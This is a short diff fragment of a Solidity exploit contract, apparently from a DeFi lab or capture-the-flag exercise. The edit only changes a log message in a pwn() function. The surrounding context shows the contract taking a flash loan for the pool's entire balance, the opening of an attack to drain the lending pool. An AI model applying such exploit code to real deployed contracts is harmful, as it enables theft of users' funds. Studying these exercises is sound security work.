@@ -79,7 +79,7 @@ contract EthLendingPoolExploit {
 
     function pwn() external {
         uint bal = address(pool).balance;
-        console.log("Executing flashloan from exploit contract");
+        console.log("Executing exploit from exploit contract");
         // 1. call flash loan
         pool.flashLoan(
             bal,
